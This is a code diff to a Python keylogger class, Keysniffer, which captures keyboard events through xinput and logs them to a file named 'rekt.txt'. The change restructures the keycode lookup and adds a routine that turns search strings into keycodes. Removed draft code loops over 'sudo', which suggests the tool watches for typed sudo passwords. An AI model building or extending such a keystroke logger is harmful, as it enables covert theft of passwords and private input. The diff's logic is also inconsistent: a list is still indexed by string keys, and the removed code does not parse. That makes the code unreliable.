@@ -6,7 +6,7 @@ import re
 class Keysniffer():
         def __init__(self, xinput_bin='/usr/bin/xinput', outfile='rekt.txt'):
                self.xinput = xinput_bin
-               self.keycodes = {}
+               self.keycodes = []
                self.outfile = outfile
                self.keyboard = self.getKeyboardID()
         
@@ -29,22 +29,23 @@ class Keysniffer():
                         codes.append(str(line).strip().split())
 
                 # Iterate through lines. If less than 3 objects in line, skip.
-                # If first item of remaining lines is numeric, assign it as key in KEYCODES
-                # dict, and assign the 3rd item as the value (3rd item is the name of the key)
+                # Create a list containing the keycode and value + second value if
+                # the string is longer than 4 objects
+                # final list will have format [code, val1, [val2]]
                 for line in codes:
                         if len(line) < 2:
                                 pass
                         else:
                                 c1 = str(line[0])
                                 if len(line) > 4:
-                                        names = [line[2], line[4]]
+                                        code_str = [c1, line[2], line[4]]
                                 else:
-                                        names = [line[2]]
+                                        code_str = [c1, line[2]]
                                 if c1.isnumeric():
-                                        self.keycodes[str(c1)] = names
+                                        self.keycodes.append(code_str)
 
 
-        def codeConverter(self, codes):
+        def codesToKeys(self, codes):
                 """
                 Convert given list of keycodes to their respective values.
                 """
@@ -53,8 +54,29 @@ class Keysniffer():
                 for item in in_buffer:
                         out_buffer.append(self.keycodes[str(item)])
                 
-
+       
+        def keysToCodes(self, search):
+                """
+                Take a string and return a list character's keycodes
+                """
+                # iterate through characters in search string, if it is alphanumeric
+                # append parentheses to match xmonad format, and append that string to
+                # the search_str[] list
+                search_str = []
+                for char in search:
+                        if str(char).isalnum():
+                                search_str.append('(' + char + ')')
+                        else:
+                                pass
                 
+                # Iterate through each char in the resulting strings from above.
+                # Then iterate through the keycode strings: if the char is in the keycode,
+                # append keycode[0] (index 0 is the actual code) to result[]
+                result = []
+                for char in search_str:
+                        for code in self.keycodes:
+                                if char in code: result.append(code[0])
+                return result
 
         def keySniff(self):
                 """
@@ -77,19 +99,7 @@ class Keysniffer():
                                 else:
                                         continue
                 
-                # Break the string we will be searching for into its individual keycodes
-                def string_to_keycodes(self, search_str):
-                        split_str = str(search_str).split
-                        search_str = []
-                        for char in sudo:
-                                search_str.append('(' + char + ')')
-                        search_codes = []
-
-                        for item in self.keycodes.keys()
-                                reverse_keys = {}
-
-
-                        for item in search_str:
+                
 
 
 
